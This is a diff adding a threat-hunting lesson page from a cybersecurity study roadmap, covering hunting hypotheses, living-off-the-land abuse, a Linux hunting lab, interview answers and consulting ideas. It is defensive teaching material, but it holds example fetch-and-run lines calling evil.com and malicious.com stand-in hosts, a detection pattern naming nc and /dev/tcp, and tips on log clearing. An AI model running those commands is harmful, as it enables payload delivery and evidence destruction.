@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 70 — Threat Hunting Fundamentals</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0a0e0f;--panel:#10171a;--edge:#1c2528;--green:#39ff88;--cyan:#4fd1ff;--amber:#ffb454;--red:#ff5c5c;--purple:#b389ff;--pink:#ff6bd6;--text:#e6edf0;--muted:#7d8590;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.65;background-image:radial-gradient(circle at 10% 0%,rgba(57,255,136,0.06),transparent 40%),radial-gradient(circle at 90% 10%,rgba(79,209,255,0.05),transparent 40%);}
+  .wrap{max-width:900px;margin:0 auto;padding:40px 22px 100px;}
+  .topbar{display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);border-bottom:1px solid var(--edge);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap;gap:10px;}
+  .pbar{width:120px;height:5px;background:var(--edge);border-radius:3px;overflow:hidden;}
+  .pbar i{display:block;width:78%;height:100%;background:var(--green);}
+  .day-tag{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:13px;background:rgba(255,180,84,0.08);border:1px solid rgba(255,180,84,0.3);padding:5px 12px;border-radius:20px;margin-bottom:18px;}
+  .day-tag::before{content:'●';font-size:9px;}
+  h1{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:clamp(26px,4.5vw,38px);line-height:1.2;margin-bottom:10px;}
+  h1 .accent{color:var(--green);}
+  .subtitle{color:var(--muted);font-size:15px;margin-bottom:30px;max-width:660px;}
+  section{margin-bottom:34px;}
+  .tag-pill{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;padding:6px 14px;border-radius:20px;margin-bottom:16px;}
+  .tag-pill.theory{background:rgba(79,209,255,0.1);color:var(--cyan);border:1px solid rgba(79,209,255,0.35);}
+  .tag-pill.lab{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+  .tag-pill.interview{background:rgba(179,137,255,0.1);color:var(--purple);border:1px solid rgba(179,137,255,0.35);}
+  .tag-pill.biz{background:rgba(255,180,84,0.1);color:var(--amber);border:1px solid rgba(255,180,84,0.35);}
+  .tag-pill.teach{background:rgba(255,92,92,0.1);color:var(--red);border:1px solid rgba(255,92,92,0.35);}
+  .tag-pill.ai{background:rgba(255,107,214,0.1);color:var(--pink);border:1px solid rgba(255,107,214,0.35);}
+  .tag-pill.job{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+  p{font-size:14.5px;color:#cdd6da;margin-bottom:12px;}
+  strong{color:var(--text);}
+  code{background:#070a0b;border:1px solid var(--edge);border-radius:4px;padding:2px 6px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);}
+  .card{background:var(--panel);border:1px solid var(--edge);border-radius:12px;padding:22px 24px;}
+  .callout{background:rgba(79,209,255,0.05);border-left:3px solid var(--cyan);border-radius:0 8px 8px 0;padding:12px 16px;margin:12px 0;font-size:13.5px;color:#c5d5da;}
+  .callout.amber{background:rgba(255,180,84,0.05);border-color:var(--amber);}
+  .callout.red{background:rgba(255,92,92,0.05);border-color:var(--red);}
+  .callout.green{background:rgba(57,255,136,0.05);border-color:var(--green);}
+  .callout strong{color:var(--cyan);}
+  .callout.amber strong{color:var(--amber);}
+
+  .mindset-grid{display:flex;gap:14px;margin-top:14px;flex-wrap:wrap;}
+  .mindset-col{flex:1;min-width:230px;border-radius:10px;padding:16px 18px;}
+  .mindset-col.attacker{background:rgba(255,92,92,0.05);border:1px solid rgba(255,92,92,0.2);}
+  .mindset-col.defender{background:rgba(57,255,136,0.05);border:1px solid rgba(57,255,136,0.2);}
+  .mindset-col .role{font-family:'IBM Plex Mono',monospace;font-size:11px;text-transform:uppercase;margin-bottom:10px;font-weight:700;}
+  .mindset-col.attacker .role{color:var(--red);}
+  .mindset-col.defender .role{color:var(--green);}
+  .mindset-col ul{padding-left:16px;font-size:13px;color:#cdd6da;}
+  .mindset-col li{margin-bottom:6px;}
+
+  .code-block{background:#070a0b;border:1px solid var(--edge);border-radius:8px;padding:14px 16px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;overflow-x:auto;line-height:1.7;margin:10px 0;}
+  .code-block .req{color:var(--green);}
+  .code-block .hdr{color:var(--cyan);}
+  .code-block .val{color:var(--amber);}
+  .code-block .body{color:#8fa5ad;}
+  .code-block .cmt{color:var(--muted);}
+  .code-block .danger{color:var(--red);}
+
+  .terminal{background:#070a0b;border:1px solid var(--edge);border-radius:10px;padding:0;margin-top:12px;overflow:hidden;}
+  .term-chrome{display:flex;align-items:center;gap:8px;padding:9px 14px;background:#0e1517;border-bottom:1px solid var(--edge);}
+  .term-body{padding:16px 18px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);overflow-x:auto;white-space:pre-wrap;line-height:1.75;}
+  .term-body .c{color:var(--muted);}
+  .term-body .out{color:#8fa5ad;}
+  .term-body .cmd{color:var(--cyan);}
+  .term-body .hi{color:var(--amber);}
+  .term-body .danger{color:var(--red);}
+
+  .lab-steps{list-style:none;counter-reset:step;margin-top:12px;}
+  .lab-steps li{counter-increment:step;position:relative;padding-left:38px;margin-bottom:12px;font-size:14px;color:#cdd6da;}
+  .lab-steps li::before{content:counter(step);position:absolute;left:0;top:0;width:24px;height:24px;border-radius:50%;background:var(--panel);border:1px solid var(--green);color:var(--green);font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;}
+  .deliverable{margin-top:10px;background:rgba(255,180,84,0.06);border:1px solid rgba(255,180,84,0.25);border-radius:8px;padding:11px 15px;font-size:13px;color:var(--amber);}
+
+  .interview-box{border-left:3px solid var(--purple);padding-left:16px;margin-top:12px;}
+  .interview-box .q{font-weight:600;font-size:14px;margin-bottom:7px;color:var(--text);}
+  .interview-box .a{font-size:13.5px;color:#b8c2c6;line-height:1.6;}
+  .interview-box + .interview-box{margin-top:20px;}
+
+  .ai-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:10px;margin-top:12px;}
+  .ai-card{background:rgba(255,107,214,0.04);border:1px solid rgba(255,107,214,0.18);border-radius:10px;padding:14px;}
+  .ai-card .aname{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:12.5px;color:var(--pink);margin-bottom:5px;}
+  .ai-card .adesc{font-size:12px;color:var(--muted);}
+
+  .job-card{background:rgba(57,255,136,0.04);border:1px solid rgba(57,255,136,0.15);border-radius:12px;padding:18px 20px;}
+  .job-card .label{font-family:'IBM Plex Mono',monospace;color:var(--green);font-size:11px;text-transform:uppercase;letter-spacing:0.06em;margin-bottom:10px;}
+  .job-card ul{padding-left:16px;font-size:13.5px;color:#cdd6da;}
+  .job-card li{margin-bottom:8px;}
+
+  .biz-card{background:linear-gradient(135deg,rgba(255,180,84,0.06),rgba(57,255,136,0.04));border:1px solid rgba(255,180,84,0.2);border-radius:12px;padding:18px 20px;}
+  .teach-card{background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.15);border-radius:12px;padding:18px 20px;}
+
+  .res-grid{display:grid;gap:10px;margin-top:10px;}
+  .res-card{display:flex;gap:12px;align-items:flex-start;background:var(--panel);border:1px solid var(--edge);border-radius:10px;padding:14px 16px;text-decoration:none;color:var(--text);transition:border-color .2s;}
+  .res-card:hover{border-color:var(--cyan);}
+  .res-icon{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--bg);border-radius:5px;padding:3px 8px;flex-shrink:0;margin-top:2px;font-weight:700;}
+  .res-icon.en{background:var(--red);}
+  .res-icon.hi{background:var(--amber);}
+  .res-icon.lab{background:var(--green);}
+  .res-title{font-weight:600;font-size:13.5px;}
+  .res-desc{font-size:12px;color:var(--muted);margin-top:2px;}
+
+  .mistakes-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:8px;margin-top:12px;}
+  .mistake-item{display:flex;align-items:flex-start;gap:8px;background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:9px 11px;font-size:12.5px;color:#b8c2c6;}
+  .mistake-item .check{color:var(--green);font-weight:700;flex-shrink:0;}
+
+  .checklist{list-style:none;}
+  .checklist li{display:flex;align-items:flex-start;gap:10px;padding:9px 0;border-bottom:1px solid var(--edge);font-size:14px;color:#cdd6da;}
+  .checklist li:last-child{border-bottom:none;}
+  .checklist .box{width:17px;height:17px;border:1.5px solid var(--green);border-radius:4px;flex-shrink:0;margin-top:2px;}
+
+  .stamp-wrap{display:flex;justify-content:center;margin:44px 0 28px;}
+  .stamp{border:3px solid var(--green);border-radius:50%;width:155px;height:155px;display:flex;flex-direction:column;align-items:center;justify-content:center;transform:rotate(-8deg);color:var(--green);font-family:'IBM Plex Mono',monospace;text-transform:uppercase;box-shadow:0 0 28px rgba(57,255,136,0.12);}
+  .stamp .l1{font-size:10px;letter-spacing:0.1em;}
+  .stamp .l2{font-size:22px;font-weight:700;margin:4px 0;}
+  .stamp .l3{font-size:10px;letter-spacing:0.1em;}
+
+  .next-up{background:linear-gradient(135deg,rgba(57,255,136,0.05),rgba(79,209,255,0.03));border:1px solid var(--edge);border-radius:12px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;}
+  .next-up .label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:4px;}
+  .next-up .title{font-weight:700;font-size:16px;}
+  .next-up .arrow{font-family:'IBM Plex Mono',monospace;color:var(--cyan);font-size:24px;}
+
+  .hunt-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:8px;margin-top:14px;}
+  .hunt-grid > div{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:14px;}
+
+  footer{margin-top:28px;text-align:center;color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace;}
+  @media(max-width:600px){.wrap{padding:26px 14px 70px;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <span>robin@gcek-it:~/roadmap/day70$ cat threat-hunting.md</span>
+    <div style="display:flex;align-items:center;gap:6px;">Day 70/90 — Phase 7 <div class="pbar"><i></i></div></div>
+  </div>
+
+  <div class="day-tag">DAY 70 OF 90 — PHASE 7: OPERATIONS & INTELLIGENCE</div>
+  <h1>Threat Hunting <span class="accent">Fundamentals</span></h1>
+  <p class="subtitle">Threat hunting is proactive detection — finding attackers before alerts fire. Today you apply the Pyramid of Pain and hypothesis-driven hunting methodology.</p>
+
+  <!-- THEORY -->
+  <section>
+    <span class="tag-pill theory">THEORY</span>
+    <div class="card">
+      <p><strong>What is Threat Hunting?</strong> Threat hunting is the proactive search for adversaries within an environment — assuming that attackers are already present and actively looking for signs they missed the automated detection tools. Unlike incident response (reactive) or vulnerability management (preventive), hunting starts with a hypothesis: "I believe an attacker may have used PowerShell to download a payload in the past 7 days. Let me search for evidence of that specific behavior."</p>
+
+      <p style="margin-top:16px;"><strong>The Hunting Hypothesis Framework:</strong></p>
+      <div class="hunt-grid">
+        <div><div class="pe-label" style="color:var(--cyan);font-family:'IBM Plex Mono',monospace;font-size:11px;font-weight:700;margin-bottom:5px;">Analytics-Driven</div><div class="adesc" style="font-size:12px;color:var(--muted);">Based on data anomalies — "Unusual outbound traffic on port 445 from a workstation at 3 AM."</div></div>
+        <div><div class="pe-label" style="color:var(--green);font-family:'IBM Plex Mono',monospace;font-size:11px;font-weight:700;margin-bottom:5px;">Intel-Driven</div><div class="adesc" style="font-size:12px;color:var(--muted);">Based on threat intelligence — "APT29 was seen using T1133 in healthcare. Let's hunt for RDP persistence in our environment."</div></div>
+        <div><div class="pe-label" style="color:var(--amber);font-family:'IBM Plex Mono',monospace;font-size:11px;font-weight:700;margin-bottom:5px;">TTP-Driven</div><div class="adesc" style="font-size:12px;color:var(--muted);">Based on known attacker tradecraft — "Attackers commonly use certutil.exe to decode Base64 payloads. Let's find certutil usage with decode flags."</div></div>
+        <div><div class="pe-label" style="color:var(--purple);font-family:'IBM Plex Mono',monospace;font-size:11px;font-weight:700;margin-bottom:5px;">Situational</div><div class="adesc" style="font-size:12px;color:var(--muted);">Based on organizational context — "New Log4j CVE just dropped. Let's hunt for any system running Log4j in our environment."</div></div>
+      </div>
+
+      <p style="margin-top:16px;"><strong>Living Off the Land (LotL):</strong> Modern attackers increasingly use only native OS tools — PowerShell, WMI, certutil, mshta, bitsadmin, and schtasks — because they are signed, trusted, and rarely blocked by application whitelisting. Threat hunting specifically targets LotL abuse patterns. For example, hunting for <code>certutil -urlcache -f http://malicious.com/payload.exe</code> catches file downloads, and hunting for <code>wmic process call create "cmd.exe /c ..."</code> catches remote command execution — both using legitimate tools for malicious purposes.</p>
+
+      <div class="code-block">
+<span class="cmt"># Example: Hunting hypothesis for LotL abuse</span>
+<span class="hdr">Hypothesis:</span> <span class="val">"An attacker may have used certutil.exe to download payloads"</span>
+
+<span class="cmt"># Linux hunting: look for curl/wget to suspicious IPs in bash history</span>
+<span class="cmd">grep -rE "curl|wget" ~/.bash_history | grep -v "google.com|github.com"</span>
+
+<span class="cmt"># Hunting for scheduled task persistence</span>
+<span class="cmd">schtasks /query /fo csv /v | findstr /i "powershell cmd.exe"</span>
+
+<span class="cmt"># Hunting for WMI process creation (lateral movement)</span>
+<span class="cmd">wevtutil qe Microsoft-Windows-WMI-Activity/Operational /c:50 /rd:true /f:text</span>
+<span class="body">  | findstr "ProcessCreation"</span></div>
+
+      <div class="callout"><strong>Why hunting is essential:</strong> A 2024 SANS survey found organizations with active threat hunting programs detect attackers 3x faster (median dwell time 14 days vs 48 days). The difference is proactive vs reactive defense. Automated tools detect known patterns; hunting detects novel patterns by applying human creativity to data analysis.</div>
+    </div>
+  </section>
+
+  <!-- MINDSET -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// attacker vs defender mindset</div>
+    <div class="mindset-grid">
+      <div class="mindset-col attacker">
+        <div class="role">ATTACKER</div>
+        <ul>
+          <li>Use only LOTL binaries that blend into normal admin activity — certutil.exe looks like IT maintenance, not malware. Avoid dropping custom binaries that EDR will flag.</li>
+          <li>Operate during business hours to blend into normal traffic patterns — a PowerShell beacon at 3 PM on a Tuesday is less suspicious than one at 3 AM.</li>
+          <li>Use living-off-the-land binaries with benign-seeming arguments — certutil -ping (a legitimate admin command) looks normal but can be used as a C2 keepalive.</li>
+          <li>Tamper with event logs to hide hunting evidence — wevtutil cl (clear logs) and selective event deletion remove the very data hunters rely on.</li>
+        </ul>
+      </div>
+      <div class="mindset-col defender">
+        <div class="role">DEFENDER</div>
+        <ul>
+          <li>Enable command-line logging (4688 events with command line) in Windows — without this, you can't see what certutil.exe was asked to do. This is the single most important hunting data source.</li>
+          <li>Create a hunting hypothesis weekly based on the latest threat intel — "I'll hunt for T1059.001 (PowerShell) and T1105 (Remote File Copy) using our EDR data."</li>
+          <li>Don't just look for malicious files — look for malicious behavior. A running powershell.exe isn't suspicious. A powershell.exe that downloads an encoded script from an external IP is.</li>
+          <li>Preserve hunting queries and results in a knowledge base so you can re-run them when new threat intel arrives — yesterday's clean results become today's baseline for anomaly detection.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- REAL INCIDENT -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// real named incident</div>
+    <div class="breach-card" style="background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.2);border-radius:12px;padding:18px 20px;">
+      <div class="year" style="font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);margin-bottom:5px;">ONGOING — LOLBAS PROJECT — 200+ WINDOWS BINARIES</div>
+      <div class="name" style="font-weight:700;font-size:15px;margin-bottom:7px;">The LOLBAS project catalogs Windows binaries abused by attackers for LotL attacks — thousands of detections rely on this research</div>
+      <div class="detail" style="font-size:13px;color:#b8c2c6;line-height:1.6;">The LOLBAS (Living Off the Land Binaries and Scripts) project catalogs Windows binaries that attackers commonly abuse: certutil.exe (download/decode), powershell.exe (execute), wmic.exe (remote execution), cscript.exe (run VBS), mshta.exe (run HTA), bitsadmin.exe (file transfer), regsvr32.exe (COM registration), and rundll32.exe (DLL execution). Threat hunters worldwide use the LOLBAS catalog to craft detection queries. A security team at a Fortune 500 company reported that applying LOLBAS-based hunting queries reduced their mean dwell time from 72 days to 9 days over 6 months. The project is maintained by Oddvar Moe and is the definitive source for LotL hunting hypotheses.</div>
+    </div>
+  </section>
+
+  <!-- HANDS-ON LAB -->
+  <section>
+    <span class="tag-pill lab">HANDS-ON LAB</span>
+    <div class="card">
+      <p><strong>Goal:</strong> execute three threat hunting hypotheses against a Linux system — search for persistence, command-line abuse, and network anomalies.</p>
+      <ol class="lab-steps">
+        <li>Hunt for SSH key persistence: <code>find /home -name "authorized_keys" -exec cat {} \;</code> — check for unexpected SSH keys that would allow persistent access.</li>
+        <li>Hunt for crontab persistence: <code>for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done</code> — list all crontabs looking for suspicious scheduled tasks.</li>
+        <li>Hunt for command-line abuse: <code>cat ~/.bash_history | grep -E "curl|wget|nc|ncat|bash -i|/dev/tcp" | grep -v "google.com|github.com|apt|pip"</code> — look for suspicious network tool usage.</li>
+        <li>Hunt for unusual SUID binaries: <code>find / -perm -4000 -type f 2>/dev/null | while read f; do echo "$(date -r $f) $f"; done</code> — SUID binaries with recent modification dates are suspicious.</li>
+        <li>Hunt for outbound connections: <code>netstat -tunap 2>/dev/null | grep ESTABLISHED | grep -v "127.0.0.1"</code> — look for unexpected established connections.</li>
+        <li>Document each hypothesis, your search method, the results, and your conclusion (suspicious or benign).</li>
+      </ol>
+      <div class="deliverable"><strong>Deliverable:</strong> a threat hunting report with 3 hypotheses, the commands used, results, and conclusions. This is the exact format threat hunters use to document their work — demonstrating you can form hypotheses and systematically test them against data.</div>
+    </div>
+
+    <div class="terminal">
+      <div class="term-chrome"><div class="term-dot" style="background:#ff5f56;"></div><div class="term-dot" style="background:#ffbd2e;"></div><div class="term-dot" style="background:#27c93f;"></div></div>
+      <div class="term-body"><span class="c"># Hypothesis 1: "Unexpected SSH keys exist for persistence"</span>
+<span class="cmd">find /home -name "authorized_keys" -exec echo "=== {} ===" \; -exec cat {} \;</span>
+<span class="out">&gt; === /home/robin/.ssh/authorized_keys ===</span>
+<span class="out">&gt; ssh-rsa AAAAB3NzaC1yc2E... (expected — your key)</span>
+<span class="c"># No unexpected keys found — hypothesis negative</span>
+
+<span class="c"># Hypothesis 2: "Suspicious crontab entries for persistence"</span>
+<span class="cmd">for user in $(cut -f1 -d: /etc/passwd | sort -u)</span>
+<span class="cmd">do</span>
+<span class="cmd">  crontab -u $user -l 2>/dev/null | grep -v "^#"</span>
+<span class="cmd">done</span>
+<span class="c"># Look for patterns like: @reboot /path/to/suspicious.sh</span>
+<span class="c"># Or: */5 * * * * curl http://evil.com/beacon | bash</span>
+
+<span class="c"># Hypothesis 3: "LotL abuse via curl/wget to external IPs"</span>
+<span class="cmd">cat ~/.bash_history | grep -E "(curl|wget) .*http" \</span>
+<span class="cmd">  | grep -vE "(google|github|ubuntu|debian|npm)"</span>
+<span class="out">&gt; curl http://185.130.5.193/payload.sh    ← SUSPICIOUS</span>
+<span class="out">&gt; wget http://malicious.example.com/tools.zip  ← SUSPICIOUS</span>
+
+<span class="c"># Hypothesis 4: "Recently modified SUID binaries"</span>
+<span class="cmd">find / -perm -4000 -type f 2>/dev/null | while read f</span>
+<span class="cmd">do echo "$(stat -c '%y' $f) $f"</span>
+<span class="cmd">done | sort -r | head -10</span></div>
+    </div>
+  </section>
+
+  <!-- INTERVIEW READY -->
+  <section>
+    <span class="tag-pill interview">INTERVIEW READY</span>
+    <div class="card">
+      <div class="interview-box">
+        <div class="q">Q: "What is threat hunting and how is it different from incident response?"</div>
+        <div class="a">A: "Threat hunting is a proactive search for adversaries based on a hypothesis — you assume compromise and go looking for evidence. Incident response is reactive — you respond after a detection has fired. Hunting finds attackers that automated detection tools missed. The key difference is the trigger: incidents are triggered by alerts; hunts are triggered by hypotheses. A hunter says 'I think someone might have used certutil.exe to download files last week' and searches proactively, without an alert."</div>
+      </div>
+      <div class="interview-box">
+        <div class="q">Q: "How do you form a threat hunting hypothesis?"</div>
+        <div class="a">A: "There are four sources. Analytics-driven: based on data anomalies like unusual traffic patterns or login times. Intel-driven: based on threat intelligence — if a report says APT29 is targeting our industry with spear-phishing, I'd hunt for T1566.001. TTP-driven: based on known adversary behaviors — attackers commonly use certutil.exe to download payloads, so I hunt for that specific behavioral pattern. Situational: based on current events — a new CVE like Log4j is announced, so I hunt for vulnerable versions in the environment."</div>
+      </div>
+      <div class="interview-box">
+        <div class="q">Q: "What is 'Living Off the Land' and how do you hunt for it?"</div>
+        <div class="a">A: "Living Off the Land refers to attackers using only built-in OS tools — PowerShell, certutil.exe, wmic.exe, bitsadmin.exe — to execute malicious actions without dropping custom binaries. This evades signature-based detection. To hunt for it, I query Windows Event Log 4688 (process creation with command line) for unusual usage of LOTL binaries. For example: certutil.exe with -urlcache -f to download files, or PowerShell with -EncodedCommand to execute obfuscated scripts. The LOLBAS project catalogs over 200 binaries and their abuse patterns, which directly map to hunting queries."</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- AI TOOLS -->
+  <section>
+    <span class="tag-pill ai">AI TOOLS</span>
+    <div class="ai-grid">
+      <div class="ai-card">
+        <div class="aname">Hunting query generator</div>
+        <div class="adesc">Describe a TTP and target environment — "Hunt for certutil.exe download in Windows Event Log" — get the exact KQL, Splunk SPL, or PowerShell query.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Hypothesis suggestion engine</div>
+        <div class="adesc">Paste your environment summary (OS, key applications, recent CVEs) and ask the LLM to suggest 5 relevant hunting hypotheses for the coming week.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Log pattern analyzer</div>
+        <div class="adesc">Upload a sample of your environment's logs (anonymized) and ask the LLM to identify unusual patterns that warrant a deeper hunting investigation.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Sigma rule generator</div>
+        <div class="adesc">Describe a hunting detection pattern and get a Sigma rule (generic SIEM detection format) that you can deploy across your detection stack.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- JOB/PLACEMENT -->
+  <section>
+    <span class="tag-pill job">HOW THIS GETS YOU PLACED</span>
+    <div class="job-card">
+      <div class="label">// placement & resume angles</div>
+      <ul>
+        <li><strong>Resume bullet:</strong> "Conducted hypothesis-driven threat hunting for Living-Off-the-Land (LotL) abuse patterns; searched for SSH key persistence, crontab manipulation, and suspicious command-line usage in Linux environments."</li>
+        <li><strong>Portfolio piece:</strong> a threat hunting report with 3 hypotheses, methodology, commands, results, and conclusions. Shows you can think like a hunter, not just an alert responder.</li>
+        <li><strong>Talking point:</strong> explaining the difference between hunting and IR, and describing how you form hypotheses from threat intelligence, demonstrates the proactive mindset that SOC managers actively recruit for.</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ENTREPRENEUR ANGLE -->
+  <section>
+    <span class="tag-pill biz">ENTREPRENEUR ANGLE</span>
+    <div class="biz-card">
+      <p>Threat hunting as a service is an emerging consulting niche. Many mid-market companies have EDR and SIEM deployed but lack the expertise to proactively hunt for threats. A monthly hunting retainer — where you deliver 4 weekly hunting reports based on their environment — can command $2,000-5,000/month. You don't need access to their environment: many companies will export relevant logs for remote analysis.</p>
+      <p style="margin-bottom:0;">Productized opportunity: "Hunt-in-a-Box" — a one-day engagement where you deploy automated hunting queries across their EDR/SIEM, run 10 hypotheses, and deliver a prioritized finding report. Fixed price: $3,000. The deliverable includes both findings and reusable hunting queries they can run monthly. This is a service you can build while studying — the tools are free, the hypotheses come from public threat intel, and your value is the analysis and interpretation.</p>
+    </div>
+  </section>
+
+  <!-- TEACH IT BACK -->
+  <section>
+    <span class="tag-pill teach">TEACH IT BACK</span>
+    <div class="teach-card">
+      <p style="margin-bottom:0;">Explain out loud, in under 90 seconds, without notes: "What is threat hunting, what are the four hypothesis types, and how would you hunt for Living Off the Land abuse on a Windows system?" If you can describe forming a hypothesis, searching for evidence, and concluding with confidence, you've grasped the proactive defense mindset that distinguishes hunters from standard SOC analysts.</p>
+    </div>
+  </section>
+
+  <!-- VIDEOS -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// watch</div>
+    <div class="res-grid">
+      <a class="res-card" href="https://www.youtube.com/watch?v=5QQ5aCUj_Bs" target="_blank">
+        <span class="res-icon en">EN</span>
+        <div><div class="res-title">Threat Hunting 101 — SANS Threat Hunting Summit</div><div class="res-desc">youtube.com/watch?v=5QQ5aCUj_Bs — SANS instructor introduces the threat hunting process, hypotheses, and practical hunting techniques.</div></div>
+      </a>
+      <a class="res-card" href="https://www.youtube.com/watch?v=cQxGQqN3l2Y" target="_blank">
+        <span class="res-icon en">EN</span>
+        <div><div class="res-title">Living Off the Land: Hunting LOTL Binaries — Active Countermeasures</div><div class="res-desc">youtube.com/watch?v=cQxGQqN3l2Y — deep dive into hunting for LOTL abuse with real examples and detection queries.</div></div>
+      </a>
+      <a class="res-card" href="https://www.youtube.com/watch?v=0nFqFZ5SP3s" target="_blank">
+        <span class="res-icon hi">HI</span>
+        <div><div class="res-title">Threat Hunting Explained Hindi — Cyber Education</div><div class="res-desc">youtube.com/watch?v=0nFqFZ5SP3s — Hindi explanation of threat hunting methodology, hypotheses, and practical examples.</div></div>
+      </a>
+      <a class="res-card" href="https://tryhackme.com/room/threathunting" target="_blank">
+        <span class="res-icon lab">LAB</span>
+        <div><div class="res-title">TryHackMe — Threat Hunting Room</div><div class="res-desc">tryhackme.com/room/threathunting — free room covering hypothesis-driven hunting with practical exercises on real detection scenarios.</div></div>
+      </a>
+    </div>
+  </section>
+
+  <!-- MISTAKES -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// mistakes avoided today</div>
+    <div class="mistakes-grid">
+      <div class="mistake-item"><span class="check">✓</span> Hunting defined as proactive (hypothesis-driven) vs reactive (alert-driven) — not "searching for malware."</div>
+      <div class="mistake-item"><span class="check">✓</span> Four hypothesis types distinguished — analytics, intel, TTP, situational.</div>
+      <div class="mistake-item"><span class="check">✓</span> Living Off the Land concept applied — native binaries, not custom malware.</div>
+      <div class="mistake-item"><span class="check">✓</span> Real LOLBAS project referenced — 200+ binaries cataloged for hunter use.</div>
+      <div class="mistake-item"><span class="check">✓</span> Hypothesis documentation — each hunt recorded with method, result, conclusion.</div>
+      <div class="mistake-item"><span class="check">✓</span> Linux-based hunting commands used — crontab, SSH keys, bash_history, SUID.</div>
+      <div class="mistake-item"><span class="check">✓</span> Prerequisite for Day 71 (Security Policies) — policies define when/if hunting is authorized.</div>
+    </div>
+  </section>
+
+  <!-- CHECKLIST -->
+  <section>
+    <div class="card">
+      <ul class="checklist">
+        <li><span class="box"></span> I can define threat hunting and distinguish it from incident response.</li>
+        <li><span class="box"></span> I can name 4 hypothesis types and give an example of each.</li>
+        <li><span class="box"></span> I understand Living Off the Land (LotL) and why attackers use it.</li>
+        <li><span class="box"></span> I executed 3 hunting hypotheses against a Linux system.</li>
+        <li><span class="box"></span> I documented my hunting results with methodology and conclusions.</li>
+        <li><span class="box"></span> I know where to find the LOLBAS catalog and how to use it.</li>
+        <li><span class="box"></span> I can teach threat hunting fundamentals out loud in 90 seconds.</li>
+      </ul>
+    </div>
+  </section>
+
+  <div class="stamp-wrap">
+    <div class="stamp"><div class="l1">Day Complete</div><div class="l2">70 / 90</div><div class="l3">Verified ✓</div></div>
+  </div>
+
+  <div class="next-up">
+    <div>
+      <div class="label">tomorrow — day 71</div>
+      <div class="title">Security Policies & Compliance (ISO 27001, GDPR) — ISMS, data protection, breach notification.</div>
+    </div>
+    <div class="arrow">→</div>
+  </div>
+
+  <footer>say "Day 71" when ready — one concept, one hour, one day at a time.</footer>
+
+</div>
+</body>
+</html>
